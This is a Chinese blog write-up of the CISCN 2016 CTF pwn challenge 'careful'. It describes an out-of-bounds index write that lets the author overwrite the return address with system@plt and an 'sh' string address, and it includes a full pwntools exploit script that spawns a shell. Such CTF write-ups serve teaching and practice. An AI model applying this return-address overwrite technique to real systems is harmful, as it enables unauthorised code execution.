title: Ciscn CTF 2016 careful writeup

date: 2016/07/11 17:13:00

---

现在才知道原来system("sh")也可以拿shell……一直以为只能用system("/bin/sh")……

题目是挺简单的，not stripped，PLT中直接有system入口，程序从main函数直接进initarray函数然后就没了，在initarray里有一个循环10次读一个字节到数组中，但是index可以越界，所以可以改写栈内存（同时又能把计循环次数的变量也给改了，所以可以无限循环）：

<!--more-->

![ciscnctf_2016_careful_writeup0.png][1]


循环读完之后会把原来的数组位置print出来，不过这段似乎并没有什么卵用。

由于PLT中已经有了system入口了，所以来个/bin/sh的地址就行了，于是为了这个地址我开始漫长的计划，先修改返回地址为printf构造参数泄漏出printf地址，找个pop｜ret的gadget再跳回循环读的地方，用system的PLT入口和算出来的/bin/sh地址再修改返回地址，完美，简直完美。

完美个屁libc-database查不出远程glibc版本算不出偏移玩个毛线。

后来才知道原来只要"sh"其实也是可以的，用ROPgadget搜出个"sh"就可以了,我真的是拒绝的。

于是这么大一圈白绕了真尴尬，写都写了舍不得删，留作个too young的纪念吧。

```python
from pwn import *
from ctypes import *

p=process('./careful')
# p=remote('106.75.32.79',10000)

# popret='080483a1'
# printf='080483c0'
# fflush='080483d0'
# system='080483e0'
# print_got='0804a00c'
# begin='0804852D'
# out='08048563'

system='080483e0'
sh='0804828e'

def w(index,value):
	p.recvuntil('index:')
	p.sendline(str(index))
	p.recvuntil('value:')
	value='0A0A0A'+value
	c=c_int32(int(value,16)).value
	p.sendline(str(c))

def reset():
	w(28,'00')

def end():
	w(28,'11')

def wdword(index,word):
	w(index,word[6:])
	w(index+1,word[4:6])
	w(index+2,word[2:4])
	w(index+3,word[0:2])
	reset()

def main():
	"""
	# write print addr
	wdword(44,printf)
	wdword(48,popret)
	wdword(52,print_got)
	wdword(56,begin)
	# wdword(60,popret)
	# wdword(64,out)
	# wdword(68,begin)
	# gdb.attach(p,'b *0x8048604')
	end()

	recv=p.recv(4)

	sys_addr=u32(recv.ljust(4,'\x00'))
	print 'system addr: '+hex(sys_addr)
	sh_addr=sys_addr-0x4cbd0+0x15d1a9
	print '/bin/sh addr: '+hex(sh_addr)

	# gdb.attach(p,'b *0x08048604')
	p.sendline('28')
	p.recvuntil('value:')
        value='0A0A0A00'
        c=c_int32(int(value,16)).value
	p.sendline(str(c))

	wdword(44,system)
	wdword(52,hex(sh_addr)[2:])
	end()
	# gdb.attach(p,'b *0x8048604')
	p.interactive()
	"""
	wdword(44,system)
	wdword(52,sh)
	end()
	p.interactive()

main()

```


[1]: /images/ciscnctf_2016_careful_writeup0.png
